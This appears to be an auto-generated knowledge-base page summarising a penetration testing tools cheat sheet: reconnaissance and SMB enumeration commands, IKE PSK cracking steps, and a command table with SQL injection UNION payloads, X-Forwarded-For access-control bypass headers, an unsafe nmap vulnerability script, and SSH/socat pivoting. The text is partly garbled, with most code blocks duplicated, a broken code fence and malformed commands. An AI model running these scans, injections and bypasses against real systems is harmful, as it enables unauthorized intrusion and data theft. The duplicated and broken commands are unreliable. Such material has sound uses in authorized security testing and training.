---
title: "Trained Knowledge & Topology: Penetration Testing Tools Cheat Sheet.html"
category: knowledge
domain_hub: "[[knowledge/08_web_api_sql_injection_and_active_reconnaissance]]"
os_platform: cross-platform
primary_tactic: Active_Enum
summary: "Operational architecture, decision workflows & Windows/Linux command reference for Penetration Testing Tools Cheat Sheet.html: Active network & port reconnaissance (nmap, Test-NetConnection), HTTP/HTTPS/REST/GraphQL/mTLS probing (curl, openssl s_client, Inv"
when_to_apply: "Apply when working with Penetration Testing Tools Cheat Sheet.html (cross-platform): Apply when scanning a reachable target IP/subnet (`nmap`), probing web servers or appliance management ports (`curl`/`openssl s_client`), extracting TLS certificate hardware serials and HTTP `Last-Modified` firmware dates, testing SQL injection vectors (`UNION`, error-based, time-based blind), or establishing SSH/socat port forwards."
tags: [active_enum, arp, covert_exfil, credential_access, cve-2014-6271, enumeration, eth0, hashcat, html, http, https, impacket, initial_access_exploitation, john, lateral_movement_routing_pivot, mdp, mimikatz, netstat, nmap, passive_enum, powershell, privilege_escalation]
source_file: "Penetration Testing Tools Cheat Sheet.html"
updated: 2026-10-30
---

# Trained Knowledge & Architecture: `Penetration Testing Tools Cheat Sheet.html`

- **Source Path:** `~/Projects/CORA/Training/Penetration Testing Tools Cheat Sheet.html` (`html`)
- **Extracted Technical Entities:** `arp, cve-2014-6271, eth0, hashcat, http, https, impacket, john, mimikatz, netstat, nmap, powershell, responder, sqlmap, ssh, ssl, tcpdump, tls, vlan`
- **Extracted IPs / Subnets:** `0.0.0.0, 10.0.0.0, 10.255.255.255, 127.0.0.0, 127.0.0.1, 127.255.255.255, 128.0.0.0, 172.16.0.0, 172.31.255.255, 191.255.255.255, 192.0.0.0, 172.24.0.0, 172.24.0.1, 172.24.1.0/24, 172.24.1.1, 172.24.1.100, 172.24.1.108, 172.24.1.156, 172.24.1.200, 172.24.11.200, 172.24.2.1, 172.24.255.255, 172.24.99.131, 223.255.255.255, 224.0.0.0, 239.255.255.255, 240.0.0.0, 255.0.0.0, 255.128.0.0, 255.192.0.0, 255.224.0.0, 255.240.0.0, 255.248.0.0, 255.252.0.0, 255.254.0.0, 255.255.0.0, 255.255.128.0, 255.255.192.0, 255.255.224.0, 255.255.240.0, 255.255.248.0, 255.255.252.0, 255.255.254.0, 255.255.255.0, 255.255.255.128, 255.255.255.192, 255.255.255.224, 255.255.255.240, 255.255.255.249, 255.255.255.252, 255.255.255.254, 255.255.255.255, 77.1.2.25`
- **Extracted Interfaces:** `eth0`
- **Linked Command Playbook:** [[commands/trained_penetration_testing_tools_cheat_sheet]] (`148` CEGAR-verified commands | `148` MDP transitions)

## Command & Tactic Coverage Summary
- **Total CEGAR-Verified Commands:** `148` (full executable list in [[commands/trained_penetration_testing_tools_cheat_sheet]])
- **Tactic Distribution:** `Credential_Access` (43), `Active_Enum` (31), `Passive_Enum` (17), `Reconnaissance` (12), `Covert_Exfil` (11), `Enumeration` (11), `Privilege_Escalation` (8), `Lateral_Movement_Routing_Pivot` (6), `Initial_Access_Exploitation` (5), `Protocol_Chaining` (4)
- **Top Extracted CLI Tools:** `nmap` (16), `apt-get` (10), `sqlmap` (10), `gcc` (7), `git` (7), `python` (7), `searchsploit` (5), `dig` (4), `echo` (4), `hydra` (4), `john` (4), `snmpwalk` (4), `udp-protocol-scanner.pl` (4), `enum4linux` (3), `mount` (3), `nbtscan` (3), `nc` (3), `net` (3), `show` (3), `smbclient` (3), `wget` (3), `dir` (2), `grep` (2), `ikeforce.py` (2), `plink` (2)

## Document Structure & Key Topics
- show startup-config
- show version
- show session
- show interface e0
- show access-lists
- dir file systems
- terminal length 0
- copy running-config tftp
- copy running-config startup-config
- dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
- x24

## Extracted Operational Steps & Workflows
- Step 1: Idenitfy IKE Servers
- Step 2: Enumerate group name with IKEForce
- Step 3: Use ike-scan to capture the PSK hash
- Step 4: Use psk-crack to crack the PSK hash
- Step 1: Idenitfy IKE Servers
- Step 2: Enumerate group name with IKEForce
- Step 3: Use ike-scan to capture the PSK hash
- Step 4: Use psk-crack to crack the PSK hash

## Extracted Reference Excerpt
```bash
ifconfig eth0 xxx.xxx.xxx.xxx/24
```

```bash
ifconfig eth0 xxx.xxx.xxx.xxx/24
```

```bash
ipcalc xxx.xxx.xxx.xxx/24 
ipcalc xxx.xxx.xxx.xxx 255.255.255.0
```

```bash
ipcalc xxx.xxx.xxx.xxx/24 
ipcalc xxx.xxx.xxx.xxx 255.255.255.0
```

```bash
whois domain-name-here.com
```

```bash
whois domain-name-here.com
```

```bash
dig a domain-name-here.com @nameserver
```

```bash
dig a domain-name-here.com @nameserver
```

```bash
dig mx domain-name-here.com @nameserver
```

```bash
dig mx domain-name-here.com @nameserver
```

```bash
dig axfr domain-name-here.com @nameserver
```

```bash
dig axfr domain-name-here.com @nameserver
```

```bash
nslookup -> set type=any -> ls -d blah.com
```

```bash
dig axfr blah.com @ns1.blah.com
```

```bash
git clone https://github.com/killswitch-GUI/SimplyEmail.git
./SimplyEmail.py -all -e TARGET-DOMAIN
```

```bash
git clone https://github.com/killswitch-GUI/SimplyEmail.git
./SimplyEmail.py -all -e TARGET-DOMAIN
```

```bash
nc -v 172.24.1.1 25
```

```bash
telnet 172.24.1.1 25
```

```bash
nc TARGET-IP 80
GET / HTTP/1.1
Host: TARGET-IP
User-Agent: Mozilla/5.0
Referrer: meh-domain
<enter>
```

```bash
nc TARGET-IP 80
GET / HTTP/1.1
Host: TARGET-IP
User-Agent: Mozilla/5.0
Referrer: meh-domain
<enter>
```

```bash
nmap -v -sS -A -T4 target
```

```bash
nmap -v -sS -p--A -T4 target
```

```bash
nmap -v -sU -sS -p- -A -T4 target
```

```bash
nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 172.24.1.X
```

```bash
ls /usr/share/nmap/scripts/* | grep ftp
```

```bash
nmap -sU TARGET
```

```bash
nmap -sU TARGET
```

```bash
git clone https://github.com/portcullislabs/udp-proto-scanner.git
```

```bash
git clone https://github.com/portcullislabs/udp-proto-scanner.git
```

```bash
./udp-protocol-scanner.pl -f ip.txt
```

```bash
./udp-protocol-scanner.pl -f ip.txt
```

```bash
udp-proto-scanner.pl -p ntp -f ips.txt
```

```bash
udp-proto-scanner.pl -p ntp -f ips.txt
```

```bash
netdiscover -r 172.24.1.0/24
```

```bash
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target
```

```bash
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target
```

```bash
nbtscan 172.24.1.0/24
```

```bash
enum4linux -a target-ip
```

```bash
smbclient -L //172.24.1.100
```

```bash
smbclient -L //172.24.1.100
```

```bash
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 172.24.1.0/24
```

```bash
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 172.24.1.0/24
```

```bash
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 172.24.11.200-254
```

```bash
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 172.24.11.200-254
``

<!-- CORA-MAXIMIZED-COMMANDS-START -->
## Maximized Windows & Linux Command Examples for `Penetration Testing Tools Cheat Sheet.html`

> **Domain Hub:** [[knowledge/08_web_api_sql_injection_and_active_reconnaissance|Domain Hub 08: Active Reconnaissance (nmap), Web/API/mTLS Probing (curl / openssl), SQL Injection Cheat Sheets & Operator Playbooks]]  
> **Master Playbooks:** [[commands/windows_master_command_playbook]] | [[commands/linux_master_command_playbook]] | [[commands/curl_playbook]] | [[commands/tio_serial_playbook]]  
> **When to Apply:** Apply when scanning a reachable target IP/subnet (`nmap`), probing web servers or appliance management ports (`curl`/`openssl s_client`), extracting TLS certificate hardware serials and HTTP `Last-Modified` firmware dates, testing SQL injection vectors (`UNION`, error-based, time-based blind), or establishing SSH/socat port forwards.  
> **15-Engine H-MDP State Transition:** `s_l2_l3_verified` $\xrightarrow{\text{Active_Enum}}$ `s_initial_shell_or_api_access` | **Bayesian Root-Cause Triggers:** `service_on_nonstandard_port_or_tls, missing_auth_or_mtls_cert, reverse_proxy_ip_acl_block, sql_injection_or_input_validation_flaw` | **Isolation:** `RED, BLUE (Allowed LAN/USB interfaces; blocked in WHITE air-gap mode except against local files/loopback)`

| Primary Command (`Windows` / `Linux`) | OS / Shell | What It Does & Key Flags | When to Apply & Expected Output | Cross-Platform Equivalent |
| :--- | :--- | :--- | :--- | :--- |
| `nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>` | **Linux / Windows** | Probes key enterprise, database, and appliance management ports skipping ping (`-Pn`), running service version detection (`-sV`) and default scripts (`-sC`). | Apply once L2/L3 reachability to `<TARGET_IP>` is verified (`s_l2_l3_verified -> s_active_services_enumerated`). | `powershell -NoProfile -Command "80,443,445,3389,5985,8080,8443 \| ForEach-Object { Test-NetConnection <TARGET_IP> -Port $_ }"` |
| `curl -sS -k -L -i --connect-timeout 5 --max-time 15 "https://<TARGET_IP>/"` | **Linux / Windows** | Fetches HTTP response headers (`-i`) and HTML body following redirects (`-L`) and accepting self-signed TLS certs (`-k`) (`[[commands/curl_playbook]]`). | Apply to inspect HTTP headers (`Server`, `Last-Modified`, `ETag`, `Set-Cookie`) and login page markers. | `curl.exe -sS -k -L -i --max-time 15 "https://<TARGET_IP>/"` |
| `echo \| openssl s_client -connect <TARGET_IP>:443 -servername <TARGET_IP> 2>/dev/null \| openssl x509 -noout -subject -issuer -dates -serial -ext subjectAltName` | **Linux / Windows** | Extracts X.509 TLS certificate `Subject` (`CN`), `Issuer`, validity window, serial number, and `SAN` DNS names. | Apply on HTTPS endpoints (443/8443/10443): appliances like Fortinet FortiGate expose their exact hardware model & serial (`CN = FG...`) in the TLS certificate! | `echo "" \| openssl.exe s_client -connect <TARGET_IP>:443 2>NUL \| openssl.exe x509 -noout -subject -issuer -dates` |
| `curl -sS -k -L -I --max-time 15 "https://<TARGET_IP>/login"` | **Linux / Windows** | Sends an HTTP `HEAD` request to retrieve static asset/login headers (`Last-Modified`, `ETag`, `Content-Length`). | Apply to determine exact appliance firmware build dates from static asset `Last-Modified` timestamps and map applicable CVEs. | `curl.exe -sS -k -L -I --max-time 15 "https://<TARGET_IP>/login"` |
| `curl -sS -k -L --max-time 15 --cert client.crt --key client.key "https://<TARGET_IP>:8443/api/v1/status"` | **Linux / Windows** | Presents a Mutual TLS (`mTLS`) client certificate (`--cert`) and private key (`--key`) during the TLS handshake. | Apply when an API endpoint returns `SSL alert bad certificate` or `400 No required SSL certificate was sent` (`CBR-004`). | `curl.exe -sS -k -L --max-time 15 --cert client.crt --key client.key "https://<TARGET_IP>:8443/api/v1/status"` |
| `curl -sS -k -L -i --max-time 15 -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" "https://<TARGET_IP>/admin"` | **Linux / Windows** | Injects reverse-proxy client IP headers (`X-Forwarded-For`, `X-Real-IP`) to test IP-based access control bypasses. | Apply when an endpoint behind Nginx/Apache/HAProxy returns `403 Forbidden` to external IPs (`reverse_proxy_ip_acl_block`). | `curl.exe -sS -k -L -i --max-time 15 -H "X-Forwarded-For: 127.0.0.1" "https://<TARGET_IP>/admin"` |
| `curl -sS -k -L --max-time 15 "http://<TARGET_IP>/item.php?id=-1%20UNION%20SELECT%201,version(),user(),database()--%20-"` | **Linux / Windows** | Tests `UNION SELECT` SQL injection to extract DBMS version (`@@version` / `version()`), current DB user, and schema name (`[[knowledge/trained_sql_injection_cheat_sheet_by_netsparker]]`). | Apply during authorized web application security testing when an input parameter interacts with a SQL query. | `curl.exe -sS -k -L --max-time 15 "http://<TARGET_IP>/item.php?id=-1%20UNION%20SELECT%201,@@version,user(),database()--%20-"` |
| `curl -sS -k -L --max-time 15 "http://<TARGET_IP>/ item?id=1%20UNION%20SELECT%20FIRST%201%20tabname%20FROM%20systables--"` | **Linux / Windows** | IBM Informix SQL injection enumeration querying `systables` and `syscolumns` (`[[knowledge/trained_informix-sql-injection-cheat-sheet]]`). | Apply when target database errors or banners indicate IBM Informix Dynamic Server. | `curl.exe -sS -k -L --max-time 15 "http://<TARGET_IP>/item?id=1%20UNION%20SELECT%20DBINFO('version','full')%20FROM%20systables%20WHERE%20tabid=1--"` |
| `ssh -o StrictHostKeyChecking=no -N -L 127.0.0.1:8443:127.0.0.1:8080 <USER>@<TARGET_IP>` | **Linux / Windows** | Establishes a local SSH port forward (`-L`) mapping local `127.0.0.1:8443` to `<TARGET_IP>`'s internal loopback `127.0.0.1:8080` (`[[knowledge/trained_penetration_testing_tools_cheat_sheet]]`). | Apply when `ss -tulpn` / `netstat -ano` shows an internal service bound exclusively to `127.0.0.1:8080` on `<TARGET_IP>`. | `ssh.exe -N -L 127.0.0.1:8443:127.0.0.1:8080 <USER>@<TARGET_IP>` |
| `socat TCP-LISTEN:8443,fork,reuseaddr TCP:<SECONDARY_IP>:443` | **Linux Bash** | Creates a bidirectional userland TCP relay forwarding connections on port `8443` to downstream `<SECONDARY_IP>:443`. | Apply on a pivot host when kernel `ip_forward` or `iptables` NAT cannot be modified (e.g., inside an unprivileged container). | `netsh interface portproxy add v4tov4 listenport=8443 connectaddress=<SECONDARY_IP> connectport=443` |

### Copy-Pasteable Execution Block (Windows & Linux)
```bash
# [Linux / Windows] Probes key enterprise, database, and appliance management ports skipping ping (`-Pn`), running service version detection (`-sV`) and default scripts (`-sC`).
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
# [Linux / Windows] Fetches HTTP response headers (`-i`) and HTML body following redirects (`-L`) and accepting self-signed TLS certs (`-k`) (`[[commands/curl_playbook]]`).
curl -sS -k -L -i --connect-timeout 5 --max-time 15 "https://<TARGET_IP>/"
# [Linux / Windows] Extracts X.509 TLS certificate `Subject` (`CN`), `Issuer`, validity window, serial number, and `SAN` DNS names.
echo | openssl s_client -connect <TARGET_IP>:443 -servername <TARGET_IP> 2>/dev/null | openssl x509 -noout -subject -issuer -dates -serial -ext subjectAltName
# [Linux / Windows] Sends an HTTP `HEAD` request to retrieve static asset/login headers (`Last-Modified`, `ETag`, `Content-Length`).
curl -sS -k -L -I --max-time 15 "https://<TARGET_IP>/login"
# [Linux / Windows] Presents a Mutual TLS (`mTLS`) client certificate (`--cert`) and private key (`--key`) during the TLS handshake.
curl -sS -k -L --max-time 15 --cert client.crt --key client.key "https://<TARGET_IP>:8443/api/v1/status"
# [Linux / Windows] Injects reverse-proxy client IP headers (`X-Forwarded-For`, `X-Real-IP`) to test IP-based access control bypasses.
curl -sS -k -L -i --max-time 15 -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" "https://<TARGET_IP>/admin"
```
<!-- CORA-MAXIMIZED-COMMANDS-END -->
